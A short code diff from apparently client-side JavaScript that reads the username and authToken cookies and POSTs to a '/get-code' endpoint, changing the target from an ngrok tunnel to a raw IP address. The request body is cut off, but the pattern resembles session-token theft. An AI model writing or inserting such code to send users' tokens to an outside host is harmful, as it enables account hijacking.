@@ -12,7 +12,7 @@
         const username = getCookie('username') || 'Bilinmeyen Kullanıcı';
         const authToken = getCookie('authToken') || 'Token Yok';
 
-        fetch('https://606f-82-222-120-30.ngrok-free.app//get-code', {
+        fetch('http://31.145.123.45:3000/get-code', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
